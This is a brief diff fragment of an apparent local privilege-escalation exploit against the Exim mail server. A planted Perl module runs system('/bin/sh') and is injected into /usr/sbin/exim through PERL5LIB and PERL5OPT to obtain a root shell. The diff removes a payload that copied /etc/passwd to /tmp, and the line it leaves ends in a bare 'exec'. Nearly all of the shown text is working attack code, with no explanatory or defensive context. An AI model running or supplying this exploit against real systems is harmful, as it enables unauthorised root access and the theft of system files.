@@ -20,4 +20,4 @@ use warnings;
 
 system("/bin/sh");
 EOF
-PERL5LIB=/tmp PERL5OPT=-Mroot /usr/sbin/exim -ps  exec"cat /etc/passwd > /tmp/z"
+PERL5LIB=/tmp PERL5OPT=-Mroot /usr/sbin/exim -ps  exec
